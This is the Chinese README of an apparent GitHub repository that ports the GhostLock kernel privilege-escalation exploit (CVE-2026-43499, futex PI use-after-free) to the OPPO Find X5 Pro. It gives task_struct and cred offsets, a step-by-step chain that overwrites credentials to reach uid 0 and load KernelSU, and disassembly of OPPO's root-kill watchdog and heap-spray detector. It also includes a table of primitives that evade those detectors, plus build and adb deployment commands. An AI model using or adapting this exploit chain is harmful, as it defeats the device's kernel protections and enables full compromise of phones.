# GhostLock — OPPO Find X5 Pro (PFEM10)

[English](README.md) · **中文**

[![build](https://github.com/diyiqiuye/ghostlock-pfem10/actions/workflows/build.yml/badge.svg)](https://github.com/diyiqiuye/ghostlock-pfem10/actions/workflows/build.yml)

GhostLock（CVE-2026-43499）针对 ColorOS 16 上 OPPO Find X5 Pro 的移植。已做到 `uid=0` 子进程 + `kernelsu.ko` 载入；root 进程被拦截。

## 漏洞

**CVE-2026-43499** —— futex PI 栈 UAF。`rt_mutex_start_proxy_lock()` 的 `-EDEADLK` 回滚路径上，当 `current` 是 requeuer 而非 waiter 时，`remove_waiter()` 会清掉 `current->pi_blocked_on`，waiter 被留在已弹出的栈帧上。

`remove_waiter` @ `0xffffffc0081ed254` —— 修复前形态。

## 设备

| | |
|---|---|
| 机型 | OPPO Find X5 Pro (PFEM10) |
| SoC | SM8450 / Adreno 730 |
| 系统 | ColorOS 16.0.3.520 (CN01) |
| 内核 | `5.10.236-android12-9-o-gaf2075ad2c06` |
| BL | 锁定，green |
| VA_BITS | 39 —— `KIMAGE_TEXT_BASE = 0xffffffc008000000` |

## 进度

| 阶段 | |
|---|---|
| compact waiter 触发（`CMP_REQUEUE_PI` → `EDEADLK`） | 成功 |
| `task_struct` 泄漏（perf） | 成功 |
| PI 写原语（8 字节；值 = `0` 或合法内核地址） | 成功 |
| `task+0x778` / `task+0x780` → `Uid=root` | 成功 |
| `kernelsu.ko` 载入 | 成功 |
| root 进程存活 | ⚠ **未定论** —— 见下 |
| Path A（UMH / `modprobe_path`） | `STATIC_USERMODEHELPER_PATH=""` |

关于「root 进程存活」：[`evidence/kill.log`](evidence/kill.log) 里的几次 run 都走到了 `uid=0`
并载入了 `kernelsu.ko`；其中**真正做了轮询的那次**，KernelSU 管理器进程**存活了 120 秒**，
`/proc/modules` 里 `kernelsu` 全程 `Live`。另一次同样链路跑完后，Android framework 的服务
不可达（`Can't find service: package/power/input/phone/wifi`），而模块仍然 `Live`。
**从未抓到过 `[ROOTCHECK-*]` 内核行，也从未抓到 `$$sys_call_number@@` 载荷**，
所以后一次的状态**归因不明**。详见 [`evidence/notes.md`](evidence/notes.md) §2.3、§2.4、§7。

## 偏移

`task_struct`

| 字段 | 偏移 |
|---|---|
| `real_cred` / `cred` | `0x778` / `0x780` |
| 缓存的 `syscallno` | `0xdf8` |
| 缓存的 `uid` / `euid` / `gid` / `egid` | `0xe00` / `0xe08` / `0xe10` / `0xe18` |

`thread_info`

| 字段 | 偏移 |
|---|---|
| `flags` | `0x0` |
| `addr_limit` | `0x8` |
| `ttbr0` | `0x10` |
| `preempt_count` | `0x18` |

`cred`

| 字段 | 偏移 | 字段 | 偏移 |
|---|---|---|---|
| `uid` | `0x4` | `cap_inheritable` | `0x28` |
| `gid` | `0x8` | `cap_permitted` | `0x30` |
| `suid` | `0xc` | `cap_effective` | `0x38` |
| `sgid` | `0x10` | `cap_bset` | `0x40` |
| `euid` | `0x14` | `cap_ambient` | `0x48` |
| `egid` | `0x18` | | |
| `fsuid` / `fsgid` | `0x1c` / `0x20` | | |

## 利用链

```
LT#2        perf 泄漏目标 task_struct → 落文件
W7 阶段 1   task+0x778 = init_cred 别名        → "Uid=root"
W7 阶段 2   task+0x780 = init_cred 别名
W7 阶段 3   零写 init_cred+8
exec        memfd_exec("ksud late-load")       → kernelsu ... Live
```

perf 泄漏：`PERF_TYPE_SOFTWARE` / `PERF_COUNT_SW_CPU_CLOCK`，`PERF_SAMPLE_REGS_INTR`，`exclude_user=1`。
取值范围 `[0xffffff8400000000, 0xffffff90000000)`，票数 ≥ 15%。

## 看门狗 —— `oplus_security_guard.ko`

`sys_enter` 缓存：

```asm
ldrsw x8, [x1, #0x118]          ; regs->syscallno
mrs   x9, sp_el0                ; current
ldr   x10, [x9, #0x780]         ; cred
str   x8,  [x9, #0xdf8]
ldr   w8,  [x10, #4]    → str x8, [x9, #0xe00]   ; uid
ldr   w8,  [x10, #0x14] → str x8, [x9, #0xe08]   ; euid
ldr   w8,  [x10, #8]    → str x8, [x9, #0xe10]   ; gid
ldr   w8,  [x10, #0x18] → str x8, [x9, #0xe18]   ; egid
```

`sys_exit` 判据：

```asm
ldr   x0,  [x8, #0xe00]         ; 缓存 uid
cbz   x0, #0x48c                ; 缓存 uid == 0 → 放行
adrp  x9, #0 ; ldrb w9, [x9]    ; g_boot_state
tbnz  w9, #0, #0x48c            ; is_unlocked → 放行
ldr   x9,  [x8, #0x780]         ; cred
ldr   w3,  [x8, #0xdf8]         ; 缓存 syscallno
cmp   x0, w10 ; b.hi #0x468     ; uid 下降沿 → 击杀路径
                                ; euid / gid / egid 同构
ldr   x9,  [x8, #8]             ; addr_limit
cmp   x9,  #0x8000000001
b.lo  #0x48c                    ; addr_limit != KERNEL_DS → 放行
sub   w9,  w3, #0x8f            ; syscallno - 143
cmp   w9,  #0x47
b.hi  #0x4a0                    ; 不在 143..214 → 击杀
ldrsw x12, [x10, x9, lsl #2]    ; 跳转表 @ .rodata+0
br    x11
0x48c: ret
0x4a0: bl oplus_root_check_succ ; printk + kevent_send_to_user
       bl oplus_root_killed     ; printk + do_exit(SIGKILL)
```

`g_boot_state` —— 1 字节 `.data..ro_after_init`，模块 init 时由 `verified_bootstate` 经 `strstr` 推导写入。`is_unlocked()` = `LDRB` + `RET`。

写模块 VA 会 KP（`CONFIG_STRICT_MODULE_RWX=y`）—— 走 physmap 别名 `0xffffff80…`。

上报载荷：`$$sys_call_number@@%d`、`$$set_id_flag@@%d`、`$$addr_limit@@%lx`、`$$enforce@@%d`。

### 豁免 syscall —— `.rodata+0`，索引 143–214

| 143 `setregid` | 144 `setgid` | 145 `setreuid` | 146 `setuid` |
|---|---|---|---|
| 147 `setresuid` | 149 `setresgid` | 203 `connect` | 204 `getsockname` |
| 208 `setsockopt` | 210 `shutdown` | 213 `readahead` | 214 `brk` |

其余 60 项 → 上报 + 击杀。

> **更正（2026-09-18）**：本表早期版本把每一项的名字都**标低了 1 号**（把 `146` 写成 `setresuid`，
> 实际 `146` 是 `setuid`、`setresuid` 是 `147`）。**号码一直是对的，只有名字错了。**
> 现名取自本机内核镜像 `sys_call_table` @ `0xffffffc00a13d8c0`。
> 特别注意：`sendmsg`(211)、`munmap`(215)、`getsockopt`(209)、`getpeername`(205) **不在豁免表内** ——
> 让线程阻塞在这几个 syscall 上再改凭据，结果是**被杀**，不是放行。
> 用 `tools/gen_exempt_table.py` 可重新生成。

**控制流要点（决定利用顺序）**：四个下降沿比较是 **`b.hi #0x468` 直接跳到分派**，
**不经过 `0x454` 的 `addr_limit` 闸**；只有"无下降沿"才会走到那个闸。
⇒ 进入分派的条件是「**有下降沿**」**或**「`addr_limit == KERNEL_DS`」，**不是被 `addr_limit` 门控**。

## 堆喷探测器 —— `oplus_secure_harden.ko`

| kretprobe | 实际 hook | 过滤 |
|---|---|---|
| `socket_kretprobe` | `ip_setsockopt` | `regs[1]` ∈ {41, 42, 48} |
| `socket_ip6_kretprobe` | `do_ipv6_setsockopt` | `regs[1]` ∈ {41, 42} |
| `cpuinfo_kretprobe` | `cpuinfo_open` | — |
| `setxattr_kretprobe` | `setxattr` | — |
| `sepolicy_reload_kretprobe` | `spolicy_reload` | — |

```asm
ldr  w8, [x1, #8]       ; regs[1]
cmp  w8, #0x29          ; 41 IP_MSFILTER
b.eq #0xd58
cmp  w8, #0x30          ; 48 MCAST_MSFILTER
b.eq #0xd60
cmp  w8, #0x2a          ; 42 MCAST_JOIN_GROUP
b.ne #0xd68             ; 其它 → 直接返回，不调用
bl   oplus_heapspray_check
```

`entry_handler_setxattr` → `oplus_heapspray_check(7)`、`entry_handler_cpuinfo` → `(6)`，均为无条件调用。

`oplus_heapspray_check` —— 4 个计数器 `heapspary_ip4` / `ip6` / `xttr` / `cpuinfo`，`ktime_get_real_ts64` 时间差，7 个上报点（`snprintf` + `printk` + `kevent_send_to_user`），受 `verified_bootstate` 门控。

### 规避

| 原语 | |
|---|---|
| `setsockopt` optname 46 `MCAST_JOIN_SOURCE_GROUP` | 不触发过滤 |
| `setsockopt` level `SOL_IPV6` (41) | 若过滤读的是 `level` 则不触发 |
| `setxattr` | 无条件计数 |
| `/proc/cpuinfo` | 无条件计数 |
| `socket()` / `socketpair()` | 未 hook |
| `sendmsg`、`pipe`、`memfd`、`add_key`、`io_uring`、mmap | 未 hook |

## Config

```
CONFIG_CFI_CLANG=y
CONFIG_PTR_AUTH=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_SET_FS=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_RANDOMIZE_MODULE_REGION_FULL=n
CONFIG_UNMAP_KERNEL_AT_EL0=y
CONFIG_ARM64_VA_BITS=39
CONFIG_ARM64_SW_TTBR0_PAN=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y
CONFIG_RANDOM_KMALLOC_CACHES=n
CONFIG_USER_NS=n
CONFIG_NF_TABLES=n
CONFIG_SYSVIPC=n
CONFIG_ANDROID_BINDER_IPC=y
CONFIG_KASAN=y
```

`perf_event_paranoid = -1`

## 编译

NDK **r28c**。`-O1` / API **26** / `-D__ARM=1` 是**固定参数** —— 它们维持回收栈帧的几何（`delta=0` 标定）。改动任何一个都要在真机上重新标定。

```bash
export ANDROID_NDK_HOME=/path/to/android-ndk-r28c
make                      # → exploit_guard
./build.sh                # 同上，自动探测 NDK
```

手动：

```bash
"$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android26-clang" \
  -D__ARM=1 -O1 -Wall -Wextra -pthread -Isrc/core -Isrc/devices/pfem10 \
  -o exploit_guard src/core/exploit.c
```

每次 push 都会云端编译（`.github/workflows/build.yml`，Ubuntu + NDK r28c，产物 `exploit_guard`）。

## 部署

```bash
adb push exploit_guard /data/local/tmp/e
adb shell chmod 755 /data/local/tmp/e
adb shell /data/local/tmp/e
```

## 文件

```
src/core/                 exploit.c  payload.c  payload.h  fdset_map.h
src/lib/                  KernelSnitch —— kernelsnitch.h  futex_hash.h  timeutils.h  utils.h
src/devices/pfem10/       pfem10_target.h
model/                    model.c —— 宿主机侧 rtmutex 链遍历模型
tools/                    kdis.py  kdis_ko.py  kdis_ko_reloc.py  gen_guard_disasm.py
                          gen_exempt_table.py  mod_layout.py  sct_dump.py
                          find_task_off.py  slide_resolve.py
artifacts/                guard_post_handler.s   击杀链，重定位已填
                          guard_relocs.txt       `.text` 重定位原始 dump
                          guard_disasm.txt       guard + 堆喷探测器
                          guard_exempt_table.txt 72 槽跳转表（真 syscall 名）
evidence/                 kill.log  notes.md —— 设备抓取及其边界
Makefile  build.sh        exploit 构建（-O1、API 26、NDK r28c）
run.sh                    设备侧运行编排（跨重启重试）
.github/workflows/        build.yml —— 云端编译 + 产物
```

## 证据

[`evidence/kill.log`](evidence/kill.log) —— 四次 root run 的 `adb shell` 原始输出：完整时间线、
目标任务 uid 变 0 的时刻、`kernelsu.ko` 载入、以及之后的状态。**先读文件头的说明**，
它列出了这个文件**没有**什么、以及为什么。

[`evidence/notes.md`](evidence/notes.md) —— 内核侧：模块地址与各 `/proc` 通道在哪种 SELinux
状态下可用；`g_boot_state` 的完整推导（含 `strstr` 关键字）；更正后的豁免表；能补齐
缺失的那半张击杀现场所需的抓取配方；以及仍未定论的清单。

[`artifacts/guard_post_handler.s`](artifacts/guard_post_handler.s) —— 重定位已填的击杀链。
旧清单里的 `adrp x9, #0` 其实是 `.data..ro_after_init`，`bl #0x4ac` 是 `oplus_root_check_succ`。
从自己的设备 pull 出厂商模块后，用 `tools/gen_guard_disasm.py` 可重新生成。

`tools/kdis_ko.py` —— RELA 按 `sh_info` 匹配；这些 build 的 `.text` 重定位在 `.rela.text.<func>` 里，按名字查会返回空。
`tools/kdis_ko_reloc.py` 更进一步，**连 section 符号也解析** —— 本 build 里看门狗各 handler 的重定位
几乎全部指向 section 符号，而 section 符号在 `.strtab` 里没有名字，只能靠 `st_shndx` 认身份。
这正是让 `g_boot_state`（`.data..ro_after_init` 里唯一那 1 字节）从「无法解析的 `adrp x9, #0`」
变成可见重定位目标的关键。

## 相关

| 项目 | |
|---|---|
| [JoinChang/ghostlock-oneplus](https://github.com/JoinChang/ghostlock-oneplus) | 参考实现；5.10 compact waiter |
| [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) | GhostLock 原始研究 |

## 许可

GPL-3.0 —— 见 [LICENSE](LICENSE)。
